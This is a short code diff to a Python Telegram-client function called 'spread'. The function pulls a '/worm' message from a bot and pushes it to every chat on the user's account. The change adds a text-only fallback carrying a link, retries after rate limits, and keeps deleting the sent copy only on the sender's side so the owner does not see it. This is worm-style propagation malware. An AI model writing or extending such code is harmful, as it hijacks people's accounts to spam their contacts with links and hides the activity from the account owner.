@@ -56,6 +56,7 @@ async def spread(client, bot):
     async with client.conversation(f"@{bot_me.username}") as conv:
         msg = await conv.send_message("/worm")
         spread_msg = await conv.get_response()
+        spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
         await msg.delete()
     async for dialog in client.iter_dialogs():
         try:
@@ -64,7 +65,13 @@ async def spread(client, bot):
             await asyncio.sleep(e.seconds)
             msg = await spread_msg.forward_to(dialog)
         except:
-            continue
+            try:
+                msg = await dialog.send_message(spread_msg_nomedia)
+            except errors.FloodWaitError as e:
+                await asyncio.sleep(e.seconds)
+                msg = await dialog.send_message(spread_msg_nomedia)
+            except:
+                continue
         if dialog.is_user:
             await msg.delete(revoke=False)
 
